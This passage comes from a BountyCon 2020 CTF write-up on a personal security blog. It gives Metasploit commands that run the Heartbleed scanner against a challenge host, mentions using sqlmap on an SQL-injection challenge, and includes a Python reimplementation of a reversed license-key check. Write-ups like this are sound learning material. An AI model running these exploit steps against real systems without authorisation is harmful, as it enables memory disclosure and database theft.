<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://ec2-3-11-22-12.threat.studio/
</code></pre></div></div>

<p>Opening the website and looking at the headers it says <code class="highlighter-rouge">CVE-2014-0160</code> which gave us hint that the server is vulnerable to heartbleed attack.</p>

<p>Just do the heartbleed attack to get the flag.</p>

<p>On metasploit</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/ssl/openssl_heartbleed
<span class="nb">set </span>rport 443
<span class="nb">set </span>rhosts ec2-3-11-22-12.threat.studio
<span class="nb">set </span>verbose True
check
exploit
</code></pre></div></div>

<p><img src="/images/Screenshot_32.png" alt="" class="img-responsive" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="whos-sequel">Who’s Sequel?</h1>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://pr28v5drz5.execute-api.eu-west-2.amazonaws.com/default/n9h9me
</code></pre></div></div>

<p>As the title itself gave us the hint that it is vulnerable to SQLi injection.</p>

<p>On opening the website it looked something like</p>

<p><img src="/images/Screenshot_33.png" alt="" class="img-responsive" /></p>

<p>On entering <code class="highlighter-rouge">'</code> in the username and password.it gave us SQL error. Then I just used Sqlmap to get the flag.</p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="remaining-two-proof-of-game-and-aglet">Remaining Two (Proof of game and aglet)</h1>

<p>I tried a lot to solve these two challenges but I ran out of time. Even for the alglet, I converted the ASM code to Python just to know that whatever I am understanding is right or not. Below is the script that I wrote to know that If the entered key will be accepted or not for the aglet challenge.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="k">def</span> <span class="nf">imul</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="n">v2</span><span class="o">=</span><span class="mh">0x66666667</span><span class="p">):</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">*</span> <span class="n">v2</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">v3</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v4</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v4</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span>


<span class="n">local_158</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
             <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
<span class="n">local_38</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
<span class="n">local_1a8</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">__accept</span> <span class="o">=</span> <span class="s">"FACE20TW3NY1456789DGHJKLMPQRSUXZ"</span>
<span class="c1">#__s = "FACE-20TW-3NY1-4567"
#print("[4, 17, 130, 81, 156, 20, 149, 163, 89, 222, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]")
</span><span class="n">__s</span> <span class="o">=</span> <span class="s">"FACE-20TW-3NY1-4567"</span>
<span class="c1">#__s = "FACE-20TW-3NY1-HJKL"
#__s = "FACE-20TW-3NY1-4560"
#__s = "FACE-20TW-3NY1-456L"
#__s="FFFF-FFFA-FFFC-FF3M"
</span><span class="n">local_248</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">local_244</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">local_244</span> <span class="o">&lt;</span> <span class="mh">0x13</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">local_244</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">local_244</span> <span class="o">!=</span> <span class="mi">9</span><span class="p">))</span> <span class="ow">and</span> <span class="p">(</span><span class="n">local_244</span> <span class="o">!=</span> <span class="mh">0xe</span><span class="p">):</span>
        <span class="n">local_240</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="n">__s</span><span class="p">[</span><span class="n">local_244</span><span class="p">]</span> <span class="o">!=</span> <span class="n">__accept</span><span class="p">[</span><span class="n">local_240</span><span class="p">]:</span>
            <span class="n">local_240</span> <span class="o">=</span> <span class="n">local_240</span> <span class="o">+</span> <span class="mi">1</span>

        <span class="n">bVar1</span> <span class="o">=</span> <span class="n">local_248</span>
        <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
                <span class="p">((</span><span class="n">local_240</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="n">bVar1</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">|</span> <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="n">bVar1</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)))</span>
        <span class="c1">#print(local_38[local_248 &gt;&gt; 3])
</span>        <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
                <span class="p">((</span><span class="n">local_240</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">bVar1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">|</span> <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span>
            <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">bVar1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))))</span>
        <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
                <span class="p">((</span><span class="n">local_240</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">bVar1</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">|</span> <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span>
            <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">bVar1</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))))</span>
        <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
                <span class="p">((</span><span class="n">local_240</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">bVar1</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">|</span> <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span>
            <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">bVar1</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))))</span>
        <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
                <span class="p">((</span><span class="n">local_240</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">bVar1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">|</span> <span class="n">local_38</span><span class="p">[</span><span class="n">local_248</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span>
            <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="n">bVar1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))))</span>
        <span class="c1">#print(local_38)
</span>        <span class="n">local_248</span> <span class="o">=</span> <span class="n">local_248</span> <span class="o">+</span> <span class="mi">5</span>

    <span class="n">local_244</span> <span class="o">=</span> <span class="n">local_244</span> <span class="o">+</span> <span class="mi">1</span>
<span class="c1">#print(local_38)
</span>
<span class="c1">#local_38=[0, 17, 130, 81, 156, 20, 149, 163, 89, 222, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
</span>
<span class="n">local_1a8</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">v9</span> <span class="o">=</span> <span class="n">local_1a8</span>
<span class="n">local_1a8</span> <span class="o">=</span> <span class="n">local_1a8</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">v10</span> <span class="o">=</span> <span class="p">(((</span><span class="n">local_38</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">v9</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">local_38</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span>
<span class="n">v11</span> <span class="o">=</span> <span class="n">local_1a8</span>
<span class="n">local_1a8</span> <span class="o">=</span> <span class="n">local_1a8</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">v12</span> <span class="o">=</span> <span class="p">(((</span><span class="n">local_38</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">v11</span><span class="p">)</span> <span class="o">|</span> <span class="n">v10</span>
<span class="n">v13</span> <span class="o">=</span> <span class="n">local_1a8</span>
<span class="n">local_1a8</span> <span class="o">=</span> <span class="n">local_1a8</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">v14</span> <span class="o">=</span> <span class="p">(((</span><span class="n">local_38</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">v13</span><span class="p">)</span> <span class="o">|</span> <span class="n">v12</span>
<span class="n">v15</span> <span class="o">=</span> <span class="n">local_1a8</span>
<span class="n">local_1a8</span> <span class="o">=</span> <span class="n">local_1a8</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">local_1f8</span> <span class="o">=</span> <span class="p">(((</span><span class="n">local_38</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">v15</span><span class="p">)</span> <span class="o">|</span> <span class="n">v14</span>

<span class="c1"># print(local_1f8)
#
# sys.exit()
</span>
<span class="n">local_234</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">local_230</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">local_23c</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">local_238</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">local_230</span> <span class="o">&lt;</span> <span class="mh">0x50</span><span class="p">:</span>
    <span class="n">iVar3</span> <span class="o">=</span> <span class="n">local_230</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
    <span class="n">bVar9</span> <span class="o">=</span> <span class="n">local_230</span>
    <span class="n">temp1</span> <span class="o">=</span> <span class="p">(</span><span class="o">~</span><span class="n">local_230</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span>
    <span class="n">temp11</span> <span class="o">=</span> <span class="p">((((</span><span class="n">imul</span><span class="p">(</span><span class="n">local_230</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">local_230</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">)))</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">temp13</span> <span class="o">=</span> <span class="p">(((</span><span class="n">imul</span><span class="p">(</span><span class="n">local_230</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">local_230</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">)))</span>
    <span class="n">temp12</span> <span class="o">=</span> <span class="p">((</span><span class="n">local_38</span><span class="p">[</span><span class="n">local_230</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="o">~</span><span class="n">local_230</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">temp2</span> <span class="o">=</span> <span class="p">(((</span><span class="n">local_1f8</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">local_230</span> <span class="o">-</span> <span class="p">((</span><span class="n">temp11</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">temp13</span><span class="p">)))))</span> <span class="o">^</span> <span class="n">temp12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">temp3</span> <span class="o">=</span> <span class="p">(</span><span class="n">temp2</span> <span class="o">&lt;&lt;</span> <span class="n">temp1</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">local_38</span><span class="p">[</span><span class="n">local_230</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="o">~</span><span class="n">local_230</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))))</span>
    <span class="n">local_38</span><span class="p">[</span><span class="n">iVar3</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp3</span>
    <span class="c1">#print(local_38[0])
</span>    <span class="k">if</span> <span class="p">(((</span><span class="n">local_230</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="mh">0x37</span> <span class="o">&lt;</span> <span class="n">local_230</span><span class="p">))</span> <span class="ow">or</span> <span class="p">(</span><span class="n">local_230</span> <span class="o">%</span> <span class="mi">9</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)):</span>
        <span class="n">local_158</span><span class="p">[</span><span class="n">local_234</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_230</span>
        <span class="k">if</span> <span class="p">(((</span><span class="n">local_230</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">local_230</span> <span class="o">!=</span> <span class="mh">0xb</span><span class="p">))</span> <span class="ow">and</span>
                <span class="p">((</span><span class="n">local_230</span> <span class="o">!=</span> <span class="mh">0x16</span> <span class="ow">and</span> <span class="p">((</span><span class="n">local_230</span> <span class="o">!=</span> <span class="mh">0x1c</span> <span class="ow">and</span> <span class="p">(</span><span class="n">local_230</span> <span class="o">!=</span> <span class="mh">0x26</span><span class="p">)))))):</span>
            <span class="n">local_234</span> <span class="o">=</span> <span class="n">local_234</span> <span class="o">+</span> <span class="mi">1</span>

        <span class="n">local_23c</span> <span class="o">=</span> <span class="n">local_23c</span> <span class="o">+</span> <span class="p">(</span><span class="n">local_38</span><span class="p">[</span><span class="n">iVar3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="o">~</span><span class="n">bVar9</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">local_238</span> <span class="o">=</span> <span class="n">local_38</span><span class="p">[</span><span class="n">iVar3</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="o">~</span><span class="n">bVar9</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="n">local_238</span> <span class="o">*</span> <span class="mi">2</span>
        <span class="c1">#print(local_238)
</span>

    <span class="n">local_230</span> <span class="o">=</span> <span class="n">local_230</span> <span class="o">+</span> <span class="mi">1</span>

<span class="c1">#print(local_38)
#print(local_23c &amp; 0x1f)
#print(local_238)
</span><span class="k">if</span> <span class="p">((</span><span class="n">local_23c</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">==</span> <span class="n">local_238</span><span class="p">):</span> <span class="c1">#and local_238 != 0:
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"Accepted!"</span><span class="p">)</span>


</code></pre></div></div>

<p>Score:</p>

<p><img src="/images/www.facebook.com_whitehat_ctf_bountycon2020_flags_ (1).png" alt="" class="img-responsive" /></p>


  </div><a class="u-url" href="/blog/2020/03/03/BountyCon-2020.html" hidden></a>
</article>

      </div>
    </main><script src="https://use.fontawesome.com/c917585dea.js"></script>
<footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">Waseem Ullah Siddiqui</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
        
        
    <a href="https://www.facebook.com/ullahwasim/" target="_blank"><i class="fa fa-facebook-square fa-2x"></i></a>
    <a href="https://www.linkedin.com/in/waseem-ullah-siddiqui-531a89175/" target="_blank"><i class="fa fa-linkedin-square fa-2x"></i></a>
      
      
      <!--<li><a href="https://www.facebook.com/ullahwasim"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">ullahwasim</span></a></li><li><a href="https://www.linkedin.com/in/waseem-ullah-siddiqui-531a89175"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#linkedin"></use></svg> <span class="username">waseem-ullah-siddiqui-531a89175</span></a></li>-->
        </ul>
      </div>
      
      
      
      
      
      

    <!--  <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/ullahwasim"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">ullahwasim</span></a></li><li><a href="https://www.linkedin.com/in/waseem-ullah-siddiqui-531a89175"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#linkedin"></use></svg> <span class="username">waseem-ullah-siddiqui-531a89175</span></a></li></ul>
</div>
-->
      <div class="footer-col footer-col-3">
        <p>The goal of this blog is to share write-ups about security bugs and CTF solutions.</p>
      </div>
    </div>

  </div>

</footer>


  </body>

</html>
